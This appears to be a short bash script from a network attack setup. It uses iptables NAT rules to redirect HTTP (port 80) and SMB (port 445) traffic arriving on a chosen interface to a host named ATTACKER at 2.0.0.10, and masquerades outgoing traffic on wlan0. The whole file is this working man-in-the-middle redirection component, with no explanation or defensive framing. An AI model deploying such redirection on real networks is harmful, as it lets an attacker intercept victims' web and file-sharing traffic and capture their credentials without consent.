#!/bin/bash

ATTACKER=2.0.0.10
for port in 80 445
do
	if ! iptables -t nat -vnL PREROUTING | grep "$1" | grep -q "$port"; then
		iptables -t nat -A PREROUTING -i "$1" -p tcp --dport $port \
		-j DNAT --to-destination $ATTACKER:$port
	fi
done

iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
